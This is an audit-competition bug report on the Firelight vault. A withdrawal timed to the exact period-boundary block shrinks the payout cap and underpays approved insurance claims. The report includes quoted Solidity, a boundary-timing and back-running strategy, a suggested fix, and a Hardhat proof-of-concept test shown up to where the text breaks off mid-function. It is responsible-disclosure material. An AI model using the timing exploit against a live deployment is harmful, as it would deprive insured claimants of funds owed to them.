# 88555 sc high a depositor withdrawing in the exact period boundary block underpays an approved incident claim by their own withdrawal while the vault still holds the money and counts it as payable

**Submitted on Aug 13th 2026 at 19:15:27 UTC by @Mrakgi for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88555
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Protocol insolvency

## Description

**Impact rows selected on the form:** *Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield*, and *Protocol insolvency*. Two rows because the defect has two faces and neither alone states it fully. Both are described below with the part of the evidence that supports them, so the triage team can discard either without losing the finding.

**Direct theft — what the PoC measures.** The funds in motion are an approved incident payout. In test 2 the insured receive 100,000 instead of 200,000, while the withdrawer's own later claim rises from 720,000 to 810,000: 90,000 of the shortfall lands with the actor who caused it. In test 1 the 200,000 shortfall splits 40,000 to the withdrawer and 160,000 retained as vault value. Every one of those figures is asserted in the test, not printed.

The word that can be argued is *theft*. The withdrawer never takes custody of an asset registered to the insured; what they do is escape the slashing the vault's own accounting assigns to them, while the insured are underpaid by the same mechanism, in the same sequence, by an overlapping amount. Read strictly, that is a transfer of value from claimant to actor. Read conservatively, it is underpayment plus unjust retention.

**Protocol insolvency — the other face.** The vault carries an approved obligation it does not discharge while holding, and itself classifying as payable, the assets that would cover it. This is deliberately *not* a claim of balance-sheet insolvency: the money is present, which is precisely what makes the shortfall indefensible rather than unavoidable.

These two rows describe the mechanism. The severity field below follows them, because the form requires it to; my own assessment is lower, and I set it out there rather than leaving the field to speak for me.

**Severity:** Critical — set to match the impact rows selected above, both of which this program classifies as Critical, which is what the submission form requires when the chosen impacts share a level.

**My own assessment is High, and I would rather say so than let the field speak for me.** Two things hold it below Critical in my reading: the shortfall is bounded by the withdrawer's share of the vault, and it needs an approved incident in that period large enough to bind the cap — and the withdrawer controls neither. What is not in doubt is the mechanism, the permissionless trigger and the measured amounts; the Impact Details and practicality sections give the numbers for either reading, including the 90% case.

**Requires a privileged role to act outside its documented behaviour:** no — the trigger is `withdraw`/`redeem`, which need no protocol role at all. Their gates are the global pause, the blocklist and the reentrancy guard, plus ordinary validation of amount, addresses and balance — all of which apply to every depositor alike.

## Brief / Intro

`payout` deliberately counts a withdrawal made during the capture period as still-exposed collateral, adding `withdrawAssets[capturePeriod + 1]` to the payable amount. The same withdrawal also writes a `totalAssets` checkpoint keyed at `block.timestamp`. When that timestamp is exactly the period start, the checkpoint *becomes* the period-start snapshot — already net of the withdrawal — and `payout` uses that snapshot as the hard cap on the payment. One amount is therefore counted as available to pay the claim and subtracted from the ceiling on that same payment. The ceiling wins, the insured are underpaid, and the withdrawer keeps part of a slashing that would otherwise reach them.

The identical run with the withdrawal **one second later** pays out everything the vault is holding — and where the claim fits inside that collateral, it pays the claim in full.

## Vulnerability Details

All code below is quoted verbatim, including the project's own comments and line wrapping.

A withdrawal request is bucketed by the period the transaction is in:

```solidity
// FirelightVault.sol:1008-1019, inside _requestWithdraw
        uint256 period = currentPeriod() + 1;
        uint256 sharesWithdraw = _convertToSharesTotals(
            assets,
            withdrawShares[period],
            withdrawAssets[period],
            Math.Rounding.Floor
        );
        withdrawAssets[period] += assets;
        withdrawShares[period] += sharesWithdraw;
        withdrawSharesOf[period][receiver] += sharesWithdraw;

        pendingWithdrawAssets += assets;
```

On a boundary timestamp `currentPeriod()` already returns the new period `P`, so the bucket is `P + 1`. That is because `periodAtTimestamp` is a floor division from the configuration epoch, and a timestamp exactly equal to a period start divides evenly into the new period:

```solidity
// FirelightVault.sol:316-320
    function periodAtTimestamp(uint48 timestamp) public view returns (uint256) {
        PeriodConfiguration memory periodConfiguration = periodConfigurationAtTimestamp(timestamp);
        // solhint-disable-next-line max-line-length
        return periodConfiguration.startingPeriod + _timestampSinceEpoch(timestamp, periodConfiguration.epoch) / periodConfiguration.duration;
    }
```

The same call then checkpoints the post-withdrawal total at the current timestamp. `_logTrace` is reached from `redeem` (`:741`) and `withdraw` (`:775`), in both cases with `_totalAssets - assets`; on the boundary its key `ts` equals the period start:

```solidity
// FirelightVault.sol:1044-1056
    function _logTrace(
        address owner,
        uint256 balance,
        uint256 _totalSupply,
        uint256 _totalAssets,
        bool isLogAssets
    ) private {
        uint48 ts = Time.timestamp();
        _traceBalanceOf[owner].push(ts, balance);
        _traceTotalSupply.push(ts, _totalSupply);

        if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
    }
```

Two properties of the checkpoint library make the overwrite exact rather than approximate. This is the in-scope fork at `contracts/core/lib/Checkpoints.sol`, not the OpenZeppelin original — the vault's totals use its `Trace256` type. A push whose key equals the latest key replaces the stored value instead of appending, so a boundary transaction can also overwrite a value another transaction wrote earlier in the same block:

```solidity
// contracts/core/lib/Checkpoints.sol:198-215
    function push(Trace256 storage self, uint48 key, uint256 value) internal returns (uint256, uint256) {
        if (self._values.length == 0) {
            self._values.push(0);
        }

        (bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();

        uint256 len = self._values.length;
        uint256 lastValue = latest(self);
        if (exists && key == lastKey) {
            self._values[len - 1] = value;
        } else {
            self._trace.push(key, uint208(len));
            self._values.push(value);
        }

        return (lastValue, value);
    }
```

and the lookup is inclusive of an equal key, so the value written *at* the boundary is the one returned as that period's opening figure:

```solidity
// contracts/core/lib/Checkpoints.sol:217-224
    /**
     * @dev Returns the value in the last (most recent) checkpoint with a key lower or equal than the search key, 
     * or zero if there is none.
     */
    function upperLookupRecent(Trace256 storage self, uint48 key) internal view returns (uint256) {
        uint208 idx = self._trace.upperLookupRecent(key);
        return idx > 0 ? self._values[idx] : 0;
    }
```

`payout` then caps the payment with that snapshot while simultaneously counting the same bucket as payable:

```solidity
// FirelightVault.sol:909-927
        // Cap by the active assets committed at the start of the covered period.
        // This is an exposure cap, not a segregated asset bucket.
        uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
        uint256 currentActiveAssets = totalAssets();

        // Withdrawals requested during the capture period are assigned to capturePeriod + 1
        // and remain payable while payout is allowed.
        uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];

        // If payout happens in the following period, withdrawals requested before payout
        // during that following period are assigned to capturePeriod + 2 and should also
        // remain payable; otherwise exposed assets could escape by withdrawing first.
        uint256 nextPeriodWithdrawals;
        if (_currentPeriod == capturePeriod + 1) {
            nextPeriodWithdrawals = withdrawAssets[capturePeriod + 2];
        }

        uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
        paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

`assetsAtCapturePeriod` is now net of the withdrawal, while the line below it adds that very amount back through `capturePeriodWithdrawals`. The contract's own comment states the policy the bucketing exists to enforce: withdrawals requested inside the exposure window remain payable, "otherwise exposed assets could escape by withdrawing first." They escape anyway — not through the bucket, which behaves exactly as written, but through the cap.

Nothing later repairs it. A checkpoint written after the boundary carries a key greater than `periodStart` and is invisible to the lookup. `payout` writes its own checkpoint (`:952`) only after the defective cap has been applied. `claimWithdraw` (`:788-810`) converts the caller's share of whatever remains in the bucket and performs no exposure recheck. In the normal same-incident flow `IncidentManager` records the short payment and closes the incident (`:423-438`), with no retry for the unpaid balance.

The snapshot design itself is sound and deliberate, and the suite already guards it — but only in the upward direction. `test/vault_payout.js:85-107` asserts that a mid-period deposit must not inflate the payout cap. `test/coverOrderAllocator/commitAllocation.js:230-245` makes the matching point for allocation capacity, though it does so against a mock vault whose snapshot is set directly via `setTotalAssetsAtSnapshot`, not through an actual deposit. The boundary case moves the snapshot the other way — downward, by an amount the very same transaction re-declares as payable — and nothing covers it.

## Impact Details

Write `A` for the collateral at the true period start and `W` for the amount withdrawn on the boundary. The cap becomes `A − W` instead of `A`.

There are two regimes, and the measured runs cover both. Where the claim is large enough that both runs hit their caps — the honest one at `A`, the defective one at `A − W` — the shortfall is exactly `W`; that is tests 1 and 3. Where the claim is smaller than `A`, the honest run pays it in full and the shortfall is bounded by the claim instead: in test 2 the withdrawal is 900,000 but the claim is only 200,000, so the insured lose 100,000, not 900,000. A claim that fits entirely under `A − W` produces no shortfall at all.

The payment is then split pro-rata between the active assets and the still-exposed withdrawal bucket, so the bucket absorbs about `paid · W/A` of the slashing and the withdrawer keeps the rest of their `W`. The contract derives the active-assets share first and assigns the remainder to the buckets (`FirelightVault.sol:936-943`), so the exact integer split is rounding-sensitive; every figure below is taken from the PoC's assertions rather than from a closed-form formula.

Three measured runs. The first two are each paired with an identical one-second-later control:

**Test 1 — 200,000 of 1,000,000 exits on the boundary.** A claim large enough to absorb the whole vault is filed.

|                                                 | Attack         | Control (+1s)  |
| ----------------------------------------------- | -------------- | -------------- |
| Collateral physically in the vault at payout    | 1,000,000 fXRP | 1,000,000 fXRP |
| `totalAssetsAt(period start)` — the cap         | 800,000        | 1,000,000      |
| Payable collateral the contract itself computes | 1,000,000      | 1,000,000      |
| **Paid to the insured**                         | **800,000**    | **1,000,000**  |
| Withdrawer keeps of her 200,000                 | 40,000         | 0              |

The insured receive 20% less than the vault was holding and had already classified as payable.

**Test 2 — a dominant staker, 900,000 of 1,000,000, exits on the boundary.** The claim is 200,000.

|                                         | Attack            | Control (+1s)      |
| --------------------------------------- | ----------------- | ------------------ |
| `totalAssetsAt(period start)` — the cap | 100,000           | 1,000,000          |
| **Paid on a 200,000 claim**             | **100,000 (50%)** | **200,000 (100%)** |
| Withdrawer keeps of her 900,000         | 810,000           | 720,000            |

Half of a valid, approved claim is not paid, while the full 1,000,000 sits in the vault. The withdrawer is 90,000 better off for having landed one second earlier.

**Test 3 — the commitment and the withdrawal land in the same boundary block, commitment first.** This is the case that decides the severity, so it is worth stating why it exists.

The obvious objection to the two runs above is that the effect ought to be self-limiting: allocation capacity is read from the same period-start snapshot (`CoverOrderAllocator._computeAvailableCapacity`), so a corrupted snapshot should also cause less cover to be sold, bounding the shortfall. That argument holds only when the commitment happens *after* the withdrawal. It does not survive transaction ordering.

The attacker only has to be ordered behind the commitment in the same block. The commitment merely *reads* `totalAssetsAt(currentPeriodStart())` and writes nothing, so it is sized against the true collateral `A`. The withdrawal then writes its own checkpoint at the boundary key — appending it, since nothing had written at that key yet — and the inclusive lookup makes that value, `A − W`, the period-start figure from then on. Capacity is bound to the honest figure; only the payout is capped by the corrupted one.

(The overwrite property quoted earlier is what makes this robust rather than order-dependent: had something already written at the boundary key — a deposit in the same block, say — the withdrawal would have replaced that value instead of appending, with the same result.)

Two things here are assumptions about off-chain operation rather than facts the repository fixes, and I flag them as such: that a matcher would commit early in a period, and that being ordered behind a known pending commitment in the same block is achievable. Neither is guaranteed by the code. What the code does guarantee, and what the test asserts, is that *if* the two land in that order, the outcome is the one tabulated below.

|                                                                  | Value                  |
| ---------------------------------------------------------------- | ---------------------- |
| True collateral at the period start                              | 1,000,000 fXRP         |
| Cover committed against it (2.0x)                                | $2,000,000             |
| `totalAssetsAt(period start)` after the withdrawal overwrites it | 100,000                |
| Collateral physically in the vault at payout                     | 1,000,000 fXRP         |
| Payable collateral the contract itself computes                  | 1,000,000 fXRP         |
| Claim filed                                                      | $2,000,000             |
| **Paid to the insured**                                          | **100,000 fXRP**       |
| **Shortfall against an honest cap**                              | **900,000 fXRP — 90%** |

Both transactions are asserted to share a block number, with the commitment at the lower index. The 90% figure is therefore not a bound derived from leverage; it is what the withdrawer's share of the vault allows, and a larger share pushes it higher.

Who loses: the insured, directly, in assets the vault holds and has already classified as payable. The incident closes at the short amount, and neither that incident nor any automatic flow revisits the unpaid balance.

To be precise about how far that goes, since it bears on severity: the shortfall is recoverable, but only by a fresh privileged action that nothing triggers automatically. A `PAYOUT_ROLE` holder can simply call `payout` again — the function carries only per-call limits (`FirelightVault.sol:885`) — or a curator can raise a *second* incident for the same real-world event. The contracts permit it — "`incidentRef` only prevents exact reference reuse and cannot detect different refs for the same real-world event" (`IncidentManager.sol:181-184`), and "cumulative loss across different incidents is not capped on-chain" (`interfaces/IIncidentManager.sol:466-469`). So the shortfall is not structurally irreversible. It is simply unpaid, silently, unless someone notices that the payout was capped below the collateral the vault was holding — and the insured have no on-chain means to compel a second incident.

Where the money goes is worth stating precisely, because it is not a clean transfer to the withdrawer. The unpaid balance stays in the vault and is shared pro-rata between the pending withdrawal buckets and the remaining shareholders. In test 1, of the 200,000 the insured do not receive, the withdrawer captures 40,000 and the other 160,000 stays as active vault value benefiting whoever still holds shares; in test 2 the split of the 100,000 shortfall is 90,000 to the withdrawer and 10,000 to the rest. The withdrawer's gain is thus a fraction of the harm, and the residual remains exposed to later events — but the loss to the insured is the full amount in every case.

## How practical is landing in the boundary block

The attacker cannot force a block timestamp, so this is opportunistic rather than deterministic, and I would rather state that plainly than overclaim.

What is certain, from the code: period duration is a whole number of days (`FirelightVaultStorage.sol:40`, enforced at `FirelightVault.sol:1085-1086`), so upcoming boundaries are known exactly, absent a newly scheduled period configuration. And a miss is cheap and non-destructive: wrapping the call in a contract that reverts unless `block.timestamp == vault.currentPeriodStart()` costs the failed transaction's gas and a nonce, leaves the withdrawal position untouched, and can be retried at the next boundary, indefinitely. A failed attempt therefore costs gas and nothing else, which matters more for practicality than the per-attempt success rate.

What I have not measured, and therefore do not claim: the share of period boundaries that actually contain a block, or the inclusion probability for a given transaction. Flare's published material supports a block time of roughly 1.8 seconds, but a short average block time does not by itself establish that a transaction can obtain a chosen integer timestamp, and I am not asserting that it does. Test 3 additionally requires being ordered behind the allocator's commitment within that block — a back-running pattern, and not guaranteed. Landing a payout also requires an approved incident in that period large enough to bind the cap, which the withdrawer cannot force.

There is also a no-attacker version: an ordinary depositor whose routine withdrawal happens to land on a boundary silently reduces that period's payout capacity. The defect degrades the payout guarantee whether or not anyone is trying.

## Why the listed out-of-scope items do not apply

The privileged-role exclusion does not reach this: `withdraw` and `redeem` need no protocol role — their gates are the pause, the blocklist, the reentrancy guard and ordinary amount and balance validation, all of which apply to every depositor — and notably neither consults `_hasActiveIncident()`, the guard that blocks deposits during an incident (`FirelightVault.sol:660` versus `:717-741` and `:755-775`). The curator, approver and payout roles follow the documented flow throughout.

The disclosure about aggregate claims not being capped on-chain concerns claims exceeding cover. This is the reverse — a single approved claim that does not exceed its cover (the PoC assesses each loss at exactly its allocated cover, never above it), which the vault declines to pay in full while holding the money. The staked-asset price disclosure does not apply either: no price moves, and the asset quantity is unchanged and present.

## Suggested fix

Adopt strict-before-boundary semantics for the period-start snapshot, consistently in both readers, so that nothing happening inside a period can define that period's opening figure:

```solidity
// FirelightVault.payout — instead of totalAssetsAt(capturePeriodStart)
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart - 1);
```

```solidity
// CoverOrderAllocator._computeAvailableCapacity — instead of
// $.vault.totalAssetsAt($.vault.currentPeriodStart())
$.vault.totalAssetsAt($.vault.currentPeriodStart() - 1)
```

Both must change together. Fixing only `payout` leaves an exact-boundary deposit able to raise allocation capacity while being excluded from payout capacity, which is the same inconsistency pointed the other way.

Two things to avoid. Re-keying the withdrawal's own checkpoint to `periodStart - 1` does not work: checkpoint keys must be non-decreasing, so the push reverts whenever something already wrote at `periodStart`, and a later same-timestamp write would reintroduce the net-of-withdrawal value anyway. And the boundary withdrawal must stay in the payable bucket — removing it there would let the assets escape slashing outright, which is exactly what the current bucketing exists to prevent.

Worth adding as regression tests: a boundary withdrawal, a boundary deposit, a boundary reward checkpoint, two checkpoints sharing the boundary timestamp, payout in both `P` and `P+1`, and multiple withdrawal beneficiaries in one bucket.

## Proof of Concept

## Proof of Concept

`test/poc_boundary_withdraw_shrinks_payout_cap.js` — a local Hardhat network against the production contracts, unmodified. Real `FirelightVault`, `CoverOrderAllocator`, `IncidentManager` and `CoverNFT` behind proxies; only the ERC20s and the price feed are mocks, both taken from the repository's own `contracts/test/`.

### Steps to reproduce

1. Clone the audit repository and check out `v1_audit_ready` (commit `42f9ea5`), then `npm install`.
2. Save the file below as `test/poc_boundary_withdraw_shrinks_payout_cap.js`. Change nothing else — no contract is modified.
3. Run:

```
npx hardhat test test/poc_boundary_withdraw_shrinks_payout_cap.js
```

4. Three tests pass. Run the full suite (`npx hardhat test`) to confirm the repository's own 454 tests still pass with the file added.

### What each test does

**Test 1 and Test 2** run an attack and a control through the same helper, parameterised only by how many seconds after the period boundary the redemption lands — 0 for the attack, 1 for the control. Scenario inputs and call sequence are otherwise identical, each on a freshly deployed stack. `time.setNextBlockTimestamp` places the redemption. The sequence in both: two stakers deposit, cover orders are created for the next period, the boundary is crossed with the redemption inside or just after it, cover is committed and settled, an incident is opened against the settled cover, the approver approves it, and the payout is measured at the receiver. The withdrawer then claims her bucket two periods later.

**Test 3** disables automining and places three transactions in one block stamped exactly at the boundary, ordered by priority fee: an oracle refresh, then the allocator's commitment, then the redemption. It asserts that the commitment and the redemption share a block number with the commitment at the lower transaction index, so the ordering the finding depends on is proven rather than assumed.

### What is asserted

Every figure in the tables above is asserted rather than printed: the period-start snapshots, the assets physically held by the vault at payout time, the still-payable withdrawal bucket, the contract's own payable sum, the committed and settled cover read back from the allocation commitment, the requested and paid amounts read from the vault's `PayoutExecuted` event, and the amounts the withdrawer later claims. Where a run ends with the withdrawer fully slashed, the test asserts that specific `NoWithdrawalAmount` revert rather than treating any failure as a zero payout.

### Full test file

```javascript
// PoC — a permissionless withdrawal executed in the block whose timestamp is exactly a period
// boundary shrinks that period's payout cap by its own amount, while the same withdrawal is
// still counted as payable collateral. An incident captured in that period is therefore
// underpaid by exactly the withdrawn amount, and the withdrawer escapes most of the slashing
// that the vault's own documentation says applies to it.
//
// No role is involved: `withdraw`/`redeem` are open to any depositor. The incident, assessment
// and payout roles all follow the documented flow.
//
// The control test is the same run with the withdrawal one second later. One second changes
// the checkpoint key from `periodStart` to `periodStart + 1`, and the payout becomes correct.
//
// Runs on a local Hardhat network against the production contracts, unmodified.
//
//   npx hardhat test test/poc_boundary_withdraw_shrinks_payout_cap.js

const { time } = require('@nomicfoundation/hardhat-network-helpers')
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')

const WEEK = 604800
const E6 = 10n ** 6n
const E18 = 10n ** 18n
const ZERO = ethers.ZeroAddress

const abiCoder = ethers.AbiCoder.defaultAbiCoder()
const marketIdOf = (chainId, protocol, market) =>
  ethers.keccak256(abiCoder.encode(['uint64', 'string', 'bytes32'], [chainId, protocol, market]))

const PROTOCOL_A = 'Morpho'
const PROTOCOL_B = 'Aave'
const MARKET_A = ethers.encodeBytes32String('market-A')
const MARKET_B = ethers.encodeBytes32String('market-B')

const usd = (n) => `$${(Number(n) / 1e18).toLocaleString('en-US', { maximumFractionDigits: 0 })}`
const fxrp = (n) => `${(Number(n) / 1e6).toLocaleString('en-US', { maximumFractionDigits: 0 })} fXRP`
const pct = (a, b) => `${((Number(a) / Number(b)) * 100).toFixed(1)}%`

const fundedSigner = async () => {
  const w = ethers.Wallet.createRandom().connect(ethers.provider)
  await ethers.provider.send('hardhat_setBalance', [w.address, '0x3635C9ADC5DEA00000'])
  return w
}

// ---------------------------------------------------------------------------
// Production stack: real FirelightVault + CoverOrderAllocator + IncidentManager
// + CoverNFT behind proxies. Only the ERC20s and the price feed are mocks, both
// taken from the repository's own contracts/test/.
// ---------------------------------------------------------------------------
async function deployStack() {
  const [deployer] = await ethers.getSigners()
  const admin = await fundedSigner()
  const curator = await fundedSigner()
  const allocatorRole = await fundedSigner()
  const configAdmin = await fundedSigner()
  const approver = await fundedSigner()
  const rejecter = await fundedSigner()
  const invalidator = await fundedSigner()
  const premiumCollector = await fundedSigner()
  const flbWallet = await fundedSigner()
  const payoutReceiver = await fundedSigner()
  const alice = await fundedSigner() // the withdrawing staker
  const bob = await fundedSigner() // the staker who stays
  const buyer = await fundedSigner()

  const MockERC20 = await ethers.getContractFactory('MockERC20')
  const asset = await MockERC20.deploy('Flare XRP', 'fXRP', 6)
  const usdc = await MockERC20.deploy('USD Coin', 'USDC', 6)

  const MockAggregatorV3 = await ethers.getContractFactory('MockAggregatorV3')
  const priceFeed = await MockAggregatorV3.deploy(18, E18) // $1.00 per fXRP

  const vaultInit = abiCoder.encode(
    ['address', 'address', 'address', 'address', 'address', 'address', 'uint256', 'uint48'],
    [deployer.address, deployer.address, deployer.address, deployer.address,
     deployer.address, deployer.address, 100_000_000n * E6, WEEK],
  )
  const VaultFactory = await ethers.getContractFactory('FirelightVault')
  const vault = await upgrades.deployProxy(VaultFactory, [asset.target, 'stfXRP', 'stfXRP', vaultInit])

  const CoverNFTFactory = await ethers.getContractFactory('CoverNFT')
  const coverNFT = await upgrades.deployProxy(
    CoverNFTFactory,
    ['Firelight Cover', 'FLCOVER', '', admin.address, deployer.address, ZERO, ZERO],
    { kind: 'transparent' },
  )

  // minCAR 12000 / effectiveLeverage 24000 => cover may reach 2.0x the collateral.
  const capacityConfig = {
    minCAR: 12000,
    firstLossBufferToken: usdc.target,
    firstLossBuffer: flbWallet.address,
    effectiveLeverage: 24000,
    minOrderMarketCoverAmount: 1,
    divergenceToleranceBps: 0,
  }

  const AllocatorFactory = await ethers.getContractFactory('CoverOrderAllocator')
  const allocator = await upgrades.deployProxy(
    AllocatorFactory,
    [{
      vault: vault.target,
      premiumCollector: premiumCollector.address,
      coverNFT: coverNFT.target,
      priceFeedAdapter: priceFeed.target,
      maxPriceAge: 3600,
      premiumTokens: [usdc.target],
      admin: admin.address,
      adminRole: admin.address,
      curatorRole: curator.address,
      allocatorRole: allocatorRole.address,
      configAdminRole: configAdmin.address,
      initialProtocolConcentrations: [
        { protocol: PROTOCOL_A, chainId: 1, maxProtocolConcentrationBps: 6000 },
        { protocol: PROTOCOL_B, chainId: 10, maxProtocolConcentrationBps: 6000 },
      ],
      newMarkets: [
        { chainId: 1, protocol: PROTOCOL_A, market: MARKET_A },
        { chainId: 10, protocol: PROTOCOL_B, market: MARKET_B },
      ],
      capacityConfig,
    }],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
  )

  const IncidentManagerFactory = await ethers.getContractFactory('IncidentManager')
  const incidentManager = await upgrades.deployProxy(
    IncidentManagerFactory,
    [admin.address, curator.address, approver.address, rejecter.address, invalidator.address,
     configAdmin.address, admin.address, admin.address, payoutReceiver.address,
     allocator.target, priceFeed.target, 3600],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] },
  )

  await coverNFT.connect(admin).grantRole(ethers.id('MINTER_ROLE'), allocator.target)
  await vault.grantRole(await vault.PAYOUT_ROLE(), incidentManager.target)
  await vault.grantRole(await vault.INCIDENT_ROLE(), incidentManager.target)
  await vault.grantRole(await vault.PAYOUT_ALLOWLIST_ROLE(), deployer.address)
  await vault.addToPayoutAllowlist(payoutReceiver.address)

  return {
    deployer, admin, curator, allocatorRole, configAdmin, approver,
    premiumCollector, flbWallet, payoutReceiver, alice, bob, buyer,
    asset, usdc, priceFeed, vault, coverNFT, allocator, incidentManager,
    marketA: marketIdOf(1, PROTOCOL_A, MARKET_A),
    marketB: marketIdOf(10, PROTOCOL_B, MARKET_B),
  }
}

const refreshOracle = (ctx) => ctx.priceFeed.setAnswer(E18)

const createOrder = (ctx, marketId, coverAmount18) =>
  ctx.allocator.connect(ctx.curator).createCoverOrder(
    ctx.buyer.address, ctx.buyer.address, 'flare1beneficiary', ctx.usdc.target,
    [{ marketId, coverRateAnnual: 500, coverAmount: coverAmount18 }], 0)

const treeOf = (orders) =>
  StandardMerkleTree.of(orders.map((o) => [o.id, [[o.marketId, o.cover]]]), ['uint256', '(bytes32,uint256)[]'])

async function settleAll(ctx, tree, orders) {
  for (const [i, leaf] of tree.entries()) {
    const order = orders.find((o) => BigInt(o.id) === BigInt(leaf[0]))
    await ctx.allocator.connect(ctx.allocatorRole).settleCoverOrder(
      leaf[0], [{ marketId: order.marketId, allocatedCover: order.cover }], tree.getProof(i))
  }
}

async function openIncident(ctx, { ref, title, captureTimestamp, losses }) {
  await ctx.incidentManager.connect(ctx.curator).createIncident(captureTimestamp, title, ethers.id(ref))
  const id = (await ctx.incidentManager.nextIncidentId()) - 1n
  await ctx.incidentManager.connect(ctx.curator).confirmIncident(id, `ipfs://${ref}`)
  await ctx.incidentManager.connect(ctx.curator).addAssessmentLosses(id, losses)
  await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(id)
  return id
}

// ---------------------------------------------------------------------------
// One scenario, parameterised only by how many seconds after the period boundary
// Alice's withdrawal lands. Everything else is identical between the two runs.
// ---------------------------------------------------------------------------
async function runScenario({ offsetSeconds, aliceStake, bobStake, coverSold, label }) {
  const ctx = await deployStack()
  const { vault, allocator, incidentManager, asset, usdc } = ctx
  const log = (...a) => console.log('   ', ...a)

  // -- period 0: Alice and Bob stake. The first-loss buffer is left empty so the whole
  //    payout has to come from the vault and the arithmetic stays readable. --
  for (const [who, amount] of [[ctx.alice, aliceStake], [ctx.bob, bobStake]]) {
    await asset.mint(who.address, amount)
    await asset.connect(who).approve(vault.target, amount)
    await vault.connect(who).deposit(amount, who.address)
  }
  const totalStake = aliceStake + bobStake
  expect(await vault.totalAssets()).to.equal(totalStake)

  await usdc.mint(ctx.buyer.address, 10_000_000n * E6)
  await usdc.connect(ctx.buyer).approve(allocator.target, ethers.MaxUint256)

  // -- period 1: orders are placed for period 2 (createCoverOrder targets currentPeriod + 1) --
  await time.increase(WEEK)
  const orders = [{ id: 0, marketId: ctx.marketA, cover: coverSold / 2n },
                  { id: 1, marketId: ctx.marketB, cover: coverSold / 2n }]
  for (const o of orders) await createOrder(ctx, o.marketId, o.cover)

  // -- the period 2 boundary. Alice redeems everything she holds, in the block whose
  //    timestamp is exactly `boundary + offsetSeconds`. Both runs land inside period 2. --
  const boundary = await vault.currentPeriodEnd()
  await time.setNextBlockTimestamp(BigInt(boundary) + BigInt(offsetSeconds))
  await vault.connect(ctx.alice).redeem(await vault.balanceOf(ctx.alice.address), ctx.alice.address, ctx.alice.address)

  expect(await vault.currentPeriod()).to.equal(2n)
  const periodStart = await vault.currentPeriodStart()
  expect(BigInt(periodStart)).to.equal(BigInt(boundary))

  const snapshot = await vault.totalAssetsAt(periodStart)
  const live = await vault.totalAssets()

  log('')
  log(`${label}  (withdrawal ${offsetSeconds}s after the period-2 boundary)`)
  log(`  Alice staked / Bob staked          : ${fxrp(aliceStake)} / ${fxrp(bobStake)}`)
  log(`  vault active assets after her exit : ${fxrp(live)}`)
  log(`  totalAssetsAt(period 2 start)      : ${fxrp(snapshot)}   <- the payout cap`)

  // -- cover is committed and settled for period 2 --
  await refreshOracle(ctx)
  const tree = treeOf(orders)
  await allocator.connect(ctx.allocatorRole).commitAllocation(2, tree.root, coverSold, coverSold)
  await settleAll(ctx, tree, orders)
  log(`  cover settled for period 2         : ${usd(coverSold)}`)

  // -- an incident captured in period 2 wipes out the covered protocols entirely --
  const incidentId = await openIncident(ctx, {
    ref: 'INC-BOUNDARY', title: 'covered protocols drained', captureTimestamp: periodStart,
    losses: [{ coverTokenId: 0, marketId: ctx.marketA, amount: orders[0].cover },
             { coverTokenId: 1, marketId: ctx.marketB, amount: orders[1].cover }],
  })

  // -- State captured immediately before the payout. The point of the finding is that the
  //    money is physically present and that the contract itself classifies it as payable,
  //    so both facts are read from chain rather than argued in prose. --
  const vaultBalanceAtPayout = await asset.balanceOf(await vault.getAddress())
  const liveAtPayout = await vault.totalAssets()
  const bucketAssets = await vault.withdrawAssets(3) // capturePeriod + 1
  // Payout happens in the capture period itself, so the contract adds no capturePeriod + 2 bucket.
  expect(await vault.withdrawAssets(4)).to.equal(0n)
  const activePayableAmount = liveAtPayout + bucketAssets

  const receiverBefore = await asset.balanceOf(ctx.payoutReceiver.address)
  const payoutTx = await incidentManager.connect(ctx.approver).approveCurrentAssessment(incidentId)
  const paidToClaimants = (await asset.balanceOf(ctx.payoutReceiver.address)) - receiverBefore

  // Read the vault's own account of the payout instead of trusting the balance delta alone.
  const payoutRc = await payoutTx.wait()
  const payoutLog = payoutRc.logs
    .map((l) => { try { return vault.interface.parseLog(l) } catch { return null } })
    .find((l) => l && l.name === 'PayoutExecuted')
  expect(payoutLog, 'the vault must emit PayoutExecuted').to.not.equal(undefined)
  const requestedAmount = payoutLog.args.requestedAmount
  expect(payoutLog.args.paidAmount).to.equal(paidToClaimants)
  expect(payoutLog.args.captureTimestamp).to.equal(periodStart)

  // -- Alice claims her withdrawal once period 4 begins (requested in period 2 -> bucket 3,
  //    claimable when currentPeriod() > 3). --
  await time.increase(2 * WEEK)
  const aliceBefore = await asset.balanceOf(ctx.alice.address)
  let aliceGot = 0n
  let claimable = 0n
  try {
    claimable = await vault.connect(ctx.alice).claimWithdraw.staticCall(3)
  } catch (e) {
    // The only revert tolerated here is the vault's own "your share floored to nothing".
    // Anything else means the scenario itself broke, and must not be read as a zero payout.
    const revertName = e.revert?.name ?? e.errorName ?? ''
    const isNoWithdrawal = revertName === 'NoWithdrawalAmount' || /NoWithdrawalAmount\(/.test(e.message ?? '')
    if (!isNoWithdrawal) throw e
  }
  if (claimable > 0n) {
    await vault.connect(ctx.alice).claimWithdraw(3)
    aliceGot = (await asset.balanceOf(ctx.alice.address)) - aliceBefore
    expect(aliceGot).to.equal(claimable)
  } else {
    await expect(vault.connect(ctx.alice).claimWithdraw(3))
      .to.be.revertedWithCustomError(vault, 'NoWithdrawalAmount').withArgs(3)
  }

  log(`  claim filed by the insured         : ${usd(coverSold)}  (= ${fxrp(coverSold / 10n ** 12n)})`)
  log(`  payout requested / actually paid   : ${fxrp(requestedAmount)} / ${fxrp(paidToClaimants)}`)
